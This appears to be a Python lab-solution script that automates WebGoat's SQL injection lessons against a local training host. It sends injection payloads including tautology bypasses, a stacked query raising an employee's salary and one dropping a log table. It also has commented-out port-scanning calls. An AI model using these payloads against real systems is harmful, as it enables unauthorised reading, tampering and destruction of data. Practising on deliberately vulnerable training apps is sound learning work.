#from requests2 import http_legit
#r = http_legit.do_http_basic("http://10.0.2.4/")
#print(r)

#from request_types import nmap_basic
#nmap_basic.scan_all_ports('10.0.2.4')

import requests

host="http://10.0.2.5:8080/WebGoat"

s = requests.Session()

#params = { 'username':'webgoat', 'password':'webgoat', 'matchingPassword':'webgoat', 'agree':'agree' }
#r = s.post(host + "/register.mvc", params=params)
#print(r.text)

params = { 'username':'webgoat', 'password':'webgoat' }
r = s.post(host + "/login", params=params)
print(r)

r = s.get(host + "/SqlInjection.lesson.lesson")
print(r)

params = { 'query':"select department from Employees where first_name='Bob'" }
r = s.post(host + "/SqlInjection/attack2", params=params)
print(r)

params = { 'account':"=Smith'", 'operator':"or", 'injection':"'1'='1" }
r = s.post(host + "/SqlInjection/assignment5a", params=params)
print(r)

params = { 'login_count':'1', 'userid':"0 or 1=1" }
r = s.post(host + "/SqlInjection/assignment5b", params=params)
print(r)

params = { 'name':"Smith' or 1=1;--", 'auth_tan':'3SL99A' }
r = s.post(host + "/SqlInjection/attack8", params=params)
print(r)

params = { 'name':"Smith'; update employees set salary=999999 where last_name='Smith';--", 'auth_tan':'3SL99A' }
r = s.post(host + "/SqlInjection/attack9", params=params)
print(r)

params = { 'action_string':"';drop table access_log;--" }
r = s.post(host + "/SqlInjection/attack10", params=params)
print(r)
